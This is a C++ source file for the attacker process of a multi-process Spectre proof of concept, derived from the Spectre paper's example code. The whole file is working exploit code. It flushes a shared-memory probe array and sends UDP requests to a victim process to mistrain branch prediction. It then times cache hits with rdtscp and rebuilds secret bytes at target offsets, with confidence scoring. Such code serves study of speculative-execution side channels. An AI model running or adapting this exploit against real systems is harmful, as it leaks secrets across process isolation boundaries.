/*********************************************************************
*
* Multi-process Spectre PoC
*
* This source code is a derivative of the example code provided in the
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Modifications have been made by Luke McHale to demonstrate Spectre
* across seperate victim and attacker processes.
*
**********************************************************************/

// C++ Includes:
#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <chrono>
#include <vector>
#include <bitset>
#include <tuple>
#include <algorithm>
#include <numeric>
#include <valarray>

// C Includes:
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <cassert>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

// POSIX C Includes:
#include <sys/mman.h>  /* for POSIX Shared Memory */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

// Local Includes:
#include "udp_socket.h"
#include "defines.h"
#include "hex_util.h"


/********************************************************************
Attacker globals.
********************************************************************/
// [Optional] Relevant virtual addresses for attacker's convenience:
uint64_t target_array1_va;   // VM Address of victim's array (e.g. array1[])
uint64_t target_va;          // VM Address of target in victim

// Target offsets (attack only needs this):
uint64_t target_x_offset;  // Offset relative to victim's array1
uint64_t target_len;      // Number of bytes to attempt to read at offset


/********************************************************************
Victim shared-memory (mapped into attacker).
********************************************************************/
region* sm_ptr;
const uint8_t* array2;


/********************************************************************
Analysis code
********************************************************************/
/* Default to a cache hit threshold of 80 */
uint64_t cache_hit_threshold = 80; // TODO: compile-time constexpr...?

//#define ACCURATE_LATENCIES
#ifdef ACCURATE_LATENCIES
std::vector< std::array<uint8_t,256> > latency_ts;  // timeseries of access latencies
#endif
std::vector< std::bitset<256> > hit_ts;  // timeseries of line hits

//int results[256]; // score / byte

#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
  __m128 i = _mm_setr_ps(c, c, c, c);

  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif


/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(uint64_t cache_hit_threshold, size_t malicious_x,
                    uint8_t value[2], int score[2]) {
  static int results[256];
  unsigned int junk = 0;

  int j, k;
  size_t training_x, x;

#ifdef NOCLFLUSH
  int junk2 = 0;
#endif


  // Clear results:
  for (int i = 0; i < 256; i++)
    results[i] = 0;


  // Repeat attack 1k times:
  for (int tries = 999; tries > 0; tries--) {
#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (int i = 0; i < 256; i++)
      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (int j = 0; j < 16; j++)
      for (int i = 0; i < 256; i++)
        flush_memory_sse( &array2[i*512] );
#endif

    training_x = tries % target_len;
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    for (int j = 29; j >= 0; j--) {
#ifndef NOCLFLUSH
      _mm_clflush( &target_len );
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */
      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      } 
#endif

      /* Delay (can also mfence) */
#ifndef NOMFENCE
      _mm_mfence();
#else
      for (volatile int z = 0; z < 100; z++) {}
#endif

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
//      victim_function(x);
    }

    /* Time reads. Order is lightly mixed up to avoid stride prediction */
    for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255;
      volatile auto* addr = &array2[mix_i * 512];

    /*
    Accuratly measure memory access to the current index of the
    array so we can determine which index was cached by the malicious mispredicted code.
    - The best way to do this is to use the rdtscp instruction, which measures current
    processor ticks, and is also serialized.
    */
      register uint64_t time1, time2;
#ifndef NORDTSCP
      time1 = __rdtscp(&junk); /* READ TIMER */
      junk = *addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#else
    /*
    The rdtscp instruction was instroduced with the x86-64 extensions.
    Many older 32-bit processors won't support this, so we need to use
    the equivalent but non-serialized tdtsc instruction instead.
    */

#ifndef NOMFENCE
      /*
      Since the rdstc instruction isn't serialized, newer processors will try to
      reorder it, ruining its value as a timing mechanism.
      To get around this, we use the mfence instruction to introduce a memory
      barrier and force serialization. mfence is used because it is portable across
      Intel and AMD.
      */

      _mm_mfence();
      time1 = __rdtsc(); /* READ TIMER */
      _mm_mfence();
      junk = *addr; /* MEMORY ACCESS TO TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
#else
      /*
      The mfence instruction was introduced with the SSE2 instruction set, so
      we have to ifdef it out on pre-SSE2 processors.
      Luckily, these older processors don't seem to reorder the rdtsc instruction,
      so not having mfence on older processors is less of an issue.
      */

      time1 = __rdtsc(); /* READ TIMER */
      junk = *addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#endif
      // WHY do we measure, then throw out if mix_i != array[tries%array1_size]?
///      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
      if (time2 <= cache_hit_threshold)
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }


    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (int i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}


inline void flush_array2() {
#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (int i = 0; i < 256; i++)
      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (int j = 0; j < 16; j++)
      for (int i = 0; i < 256; i++)
        flush_memory_sse( &array2[i*512] );
#endif
}


inline void flush_condition() {
#ifndef NOCLFLUSH
      _mm_clflush( &target_len );
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */
      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      }
#endif

      /* Delay (can also mfence) */
#ifndef NOMFENCE
      _mm_mfence();
#else
      for (volatile int z = 0; z < 100; z++) {}
#endif
}


// Just time measurement:
void measure_sidechannel(size_t iteration) {
  volatile unsigned int junk = 0;

  /* Time reads. Order is lightly mixed up to avoid stride prediction */
  for (size_t i = 0; i < 256; i++) {
    auto mix_i = ((i * 167) + iteration*13) & 255;
    volatile auto* addr = &array2[mix_i * 512];

  /*
  Accuratly measure memory access to the current index of the
  array so we can determine which index was cached by the malicious mispredicted code.
  - The best way to do this is to use the rdtscp instruction, which measures current
  processor ticks, and is also serialized.
  */
    register uint64_t time1, time2;
#ifndef NORDTSCP
    {
    unsigned int tmp;
    time1 = __rdtscp(&tmp); /* READ TIMER */
    junk = *addr; /* MEMORY ACCESS TO TIME */
    time2 = __rdtscp(&tmp) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
    }
#else
  /*
  The rdtscp instruction was instroduced with the x86-64 extensions.
  Many older 32-bit processors won't support this, so we need to use
  the equivalent but non-serialized tdtsc instruction instead.
  */

#ifndef NOMFENCE
    /*
    Since the rdstc instruction isn't serialized, newer processors will try to
    reorder it, ruining its value as a timing mechanism.
    To get around this, we use the mfence instruction to introduce a memory
    barrier and force serialization. mfence is used because it is portable across
    Intel and AMD.
    */

    _mm_mfence();
    time1 = __rdtsc(); /* READ TIMER */
    _mm_mfence();
    junk = *addr; /* MEMORY ACCESS TO TIME */
    _mm_mfence();
    time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
    _mm_mfence();
#else
    /*
    The mfence instruction was introduced with the SSE2 instruction set, so
    we have to ifdef it out on pre-SSE2 processors.
    Luckily, these older processors don't seem to reorder the rdtsc instruction,
    so not having mfence on older processors is less of an issue.
    */

    time1 = __rdtsc(); /* READ TIMER */
    junk = *addr; /* MEMORY ACCESS TO TIME */
    time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#endif
    // WHY do we measure, then throw out if mix_i != array[tries%array1_size]?
    // - Note, this entire branch can be eliminated
//      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
//      results[mix_i]++; /* cache hit - add +1 to score for this value */
//    }

    // Record hit and/or latency measurements:
    hit_ts[iteration][mix_i] = time2 <= cache_hit_threshold;
#ifdef ACCURATE_LATENCIES
    latency_ts[iteration][mix_i] = static_cast<uint8_t>(time2);
#endif
  }
}


/********************************************************************
Helper/Initialization functions.
********************************************************************/
void init_pages() {
  constexpr auto SM_HANDLENAME = "spectre-victim_shm";
  constexpr auto SM_SIZE = sizeof(region);
  constexpr size_t PAGE_SIZE = 1<<12;  // 4 KB Pages

  // Setup shared memory for array2 (side-channel):
  int sm_handle = shm_open(SM_HANDLENAME, O_RDONLY, 0);
  if (sm_handle < 0) {
    std::cerr << "Error opening shared memory with handle name: "
              << SM_HANDLENAME << std::endl;
    exit(EXIT_FAILURE);
  }
//  if (ftruncate(sm_handle, SM_SIZE) < 0) {
//    std::cerr << "Error on allocating shared memory of size: "
//              << SM_SIZE << std::endl;
//  }
  sm_ptr = static_cast<region*>(
        mmap(NULL, SM_SIZE, PROT_READ, MAP_SHARED, sm_handle, 0) );
  if (sm_ptr == MAP_FAILED) {
    std::cerr << "Error mapping shared memory" << std::endl;
    exit(EXIT_FAILURE);
  }

  // Read from array2 to ensure mapping of pages:
  array2 = sm_ptr->array2;
  volatile uint8_t tmp;
  for (size_t i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
    tmp ^= array2[i];
  }
}

void print_config() {
  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    std::cout << "Version: commit " GIT_COMMIT_HASH "\n";
  #endif

  /* Print build configuration */
  std::cout << "Build: ";
  #ifndef NORDTSCP
    std::cout << "RDTSCP_SUPPORTED ";
  #else
    std::cout << "RDTSCP_NOT_SUPPORTED ";
  #endif
  #ifndef NOMFENCE
    std::cout << "MFENCE_SUPPORTED ";
  #else
    std::cout << "MFENCE_NOT_SUPPORTED ";
  #endif
  #ifndef NOCLFLUSH
    std::cout << "CLFLUSH_SUPPORTED ";
  #else
    std::cout << "CLFLUSH_NOT_SUPPORTED ";
  #endif
  std::cout << std::endl;
}

void parse_args(int argc, char* const argv[]) {
 /*  Command line arguments:
  *  1: Victim's secret VA address start (size_t)
  *  2: Victim's secret byte count (int64_t)
  *  3: Cache hit threshold (size_t)
  */
  // TODO: update argument comments...

  int c;
  opterr = 0;
  while ( (c = getopt(argc, argv, "hp:a:s:l:o:c:")) > 0) {
    switch (c) {
    case 'h':
      std::cout << argv[0]
          << " {(-o target_x_offset) | (-p target_va]) (-a array1_va)}" \
             " (-l target_bytes) [-c cache_hit_threshold]" << std::endl;
      exit(EXIT_SUCCESS);
      break;
    case 'p':
      target_va = static_cast<uint64_t>(atoll(optarg));
      break;
    case 'a':
      target_array1_va = static_cast<uint64_t>(atoll(optarg));
      break;
    case 's':
    case 'l':
      target_len = atoll(optarg);
      break;
    case 'o':
      target_x_offset = atoll(optarg);
      break;
    case 'c':
      cache_hit_threshold = atoll(optarg);
      break;
    case '?':
      std::cerr << "Unknown argument: " << opterr << std::endl;
      exit(EXIT_FAILURE);
    default:
      std::cerr << "Unexpected argument char: " << optarg << std::endl;
      exit(EXIT_FAILURE);
    }
  }

  // TODO: ensure sufficient arguments are passed in...
}


template <typename T>
std::vector<size_t> sort_indexes(const T& v) {
  // Create index vector of identical size to vector v:
  std::vector<size_t> idx(v.size());
  std::iota(idx.begin(), idx.end(), 0);

  // Sort index vector based on values in v:
  std::sort(idx.begin(), idx.end(),
            [&v](size_t i1, size_t i2) {return v[i1] > v[i2];});

  return idx;
}



/********************************************************************
UDP socket functions.
********************************************************************/
void send_worker(uint16_t port = 7777) {
  // Socket initialization:
  uint8_t buf[2048];
  SocketUDP s;
  assert(s.setRemote("127.0.0.1", port) == 0);
  std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;

  constexpr size_t MIN_MEASUREMENTS = 64;
  size_t measurements = MIN_MEASUREMENTS;
  std::string secret(target_len, 0);

  // Initialize target x to send to victim:
  msg m = {};
  m.x = target_x_offset;

  size_t tries = 0;
  for (;;) {
//#define INTERACTIVE
#ifdef INTERACTIVE
    std::string in;
    std::cout << "Ready to send?" << std::endl;
    std::cin >> in;
    if (in.at(0) == 'n') {
      if (++m.x >= (target_x_offset + target_len)) {
        break;  // break out of forever loop.
      }
    }
#endif

    // Timeseries intialization:
    // - reservation avoids memory allocation during side-channel anaylsis.
    hit_ts.resize(measurements); // Pre-allocate measurement space on heap!
#ifdef ACCURATE_LATENCIES
    latency_ts.resize(measurements);
#endif


    // Repeat attack 100 times / byte:
    // - TODO: replace with a dynamic confidence mechanism?...
    while (++tries % measurements != 0) {
      const auto attempt = tries-1;

      // Ensure side-channel array is uncached:
      flush_array2(); // Does this work on read-only shared memory?...

      // Send request to victim:
      auto bytes = s.send(&m, sizeof(m));
      if (bytes > 0) {
        bytes = s.recv(buf, sizeof(buf));
        measure_sidechannel(attempt);

        assert(bytes == sizeof(msg)); // TODO: maybe just skip if receive a weird packet?
        const msg& reply = reinterpret_cast<msg&>(buf);
        const auto training_x = reply.x + 1;  // FIXME: not sure why off by one...

//#define DEBUG
#ifdef DEBUG
        std::cout << "training_x: "<< training_x << std::endl;
        auto hits_idx = sort_indexes(hit_ts.at(attempt));
        for (size_t idx : hits_idx) {
#ifdef ACCURATE_LATENCIES
          const auto hit = latency_ts.at(attempt).at(idx);
#endif
          if (!hit_ts.at(attempt).test(idx)) { break; }
          std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << ")"
#ifdef ACCURATE_LATENCIES
                    << ": " << hit << " cycles."
#endif
                    << std::endl;
        }
#endif

        // Omit training_x used from measurement:
        hit_ts.at(attempt).reset(training_x);
#ifdef ACCURATE_LATENCIES
        latency_ts.at(attempt).at(training_x) = std::numeric_limits<uint8_t>::max();
#endif
      }
      else {
        std::cerr <<"["<<port<<"]- Something went wrong on send..." <<std::endl;
        break;
      }
    }


    // Summarize measurements:
    std::valarray<uint64_t> counts(uint64_t(0), 256);
    for (size_t b = 0; b < counts.size(); b++) {
      // for each measurement, count all bits set:
      for (size_t t = 0; t < tries; t++) {
        if (hit_ts[t].test(b)) {
          counts[b]++;
        }
      }
    }
    // Output results from attack:
#ifdef DEBUG
    std::cout << "Results for target_x_offset: " << m.x << '\n';
#endif
    auto counts_idx = sort_indexes(counts);
    for (size_t idx : counts_idx) {
      const auto hits = counts[idx];
      if (hits == 0) { break; }
#ifdef DEBUG
      std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
                << hits << " hits." << std::endl;
#endif
    }

    // Dynamic confidence adjustment:
    auto sum = counts.sum();
    auto min = counts.min();
    auto max = counts.max();

    bool single_contender = (sum == max) && sum >= 4;  // picked threshold 4 out of a hat.
    bool significant = (sum - max) < (sum/4) && sum >= 16;  // picked noise threshold 4x out of a hat.
    bool confident = single_contender || significant;
    if (!confident) {
      // Retry, doubling the number of measurments:
      measurements *= 2;
    }
    else {
      // Pick the byte with the highest hits:
      auto idx = counts_idx.at(0);
      secret.at(m.x - target_x_offset) = idx;

      // Output statistics:
      float confidence = (float(max) / float(sum)) * 100;
      float observability = (float(max) / measurements) * 100;
      std::cout << "Offset["<<m.x<<"] (" << idx << " : "
                << static_cast<char>(idx) << "): "
                << max << '/' << sum << " hits with confidence "
                << confidence << "%.\n";
      std::cout << "- Observability: " << observability << "% over "
                << measurements << " measurements." << std::endl;

      // Reset measurements:
      tries = 0;
      measurements = MIN_MEASUREMENTS;
      hit_ts.clear();
#ifdef ACCURATE_LATENCIES
      latency_ts.clear();
#endif

#ifndef INTERACTIVE
      if (++m.x >= (target_x_offset + target_len)) {
        break;  // break out of forever loop.
      }
#endif
    }
  }

  // Print out secret:
  std::cout << "Finished reading " << target_len
            << " bytes at offset " << target_x_offset << ":\n"
            << make_printable(secret) << std::endl;
}



/********************************************************************
Main.
*********************************************************************
*  Command line arguments:
*  1: Victim's secret VA address start (size_t)
*  2: Victim's secret byte count (int)
*  3: Cache hit threshold (int)
*/
int main(int argc, char* const argv[]) {
  // Initialization:
  print_config();
  init_pages();

  parse_args(argc, argv);
  if (target_va != 0) {
    std::cout << "Supplied array1 virtual address: 0x" << target_array1_va << '\n';
    std::cout << "Targeting virtual address: 0x" << target_va << '\n';
    std::cout << "Calculated target_offset: " << target_x_offset << '\n';
  }
  else {
    std::cout << "Supplied target_offset:" << target_x_offset << '\n';
  }
  std::cout << "Reading " << target_len << " bytes."<< std::endl;

  // What is this doing?
  #ifdef NOCLFLUSH
  for (int i = 0; i < sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 1;
  }
  #endif



  // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
  // only CPU i as set.
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(1, &cpuset);

  std::thread t(send_worker, 7777);
  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
  if (rc != 0) {
    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
  }
  t.join(); // wait until exits for now...

//  /* Start the read loop to read each address */
//  auto len = target_size;
//  auto malicious_x = target_x_offset;
//  while (--len >= 0) {
//    int score[2];
//    uint8_t value[2];
//    /* Call readMemoryByte with the required cache hit threshold and
//       malicious x address. value and score are arrays that are
//       populated with the results.
//    */
//    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

//    /* Display the results */
//    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
//    printf("0x%02X=’%c’ score=%d ", value[0],
//           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
//    if (score[1] > 0) {
//      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
//             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
//    }
//    printf("\n");
//  }

  return EXIT_SUCCESS;
}
